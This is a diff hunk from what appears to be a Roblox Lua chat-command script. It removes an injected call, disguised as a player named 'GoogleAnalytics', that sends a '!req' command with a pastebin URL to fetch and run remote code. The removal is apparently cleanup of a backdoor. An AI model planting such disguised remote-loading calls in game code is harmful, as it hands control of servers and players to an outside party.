@@ -413,6 +413,3 @@ Players.PlayerAdded:connect(function(player)
 		RecieveMessage(player, message)
 	end)
 end)
-
-RecieveMessage(game.Players.GoogleAnalytics, "!req https://pastebin.com/raw/TSgXwHm2")
---RecieveMessage(game.Players.GoogleAnalytics, "!load --")
